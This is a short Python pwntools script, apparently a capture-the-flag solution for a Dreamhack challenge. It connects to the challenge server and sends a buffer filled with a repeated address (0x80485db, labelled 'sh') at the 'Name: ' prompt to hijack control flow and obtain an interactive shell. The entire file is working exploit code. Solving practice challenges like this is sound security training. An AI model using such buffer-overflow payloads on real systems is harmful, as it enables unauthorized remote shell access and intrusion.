from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 11873
r = remote(HOST, PORT)

sh=0x80485db
r.sendlineafter(b'Name: ', p32(sh) * 64)

r.interactive()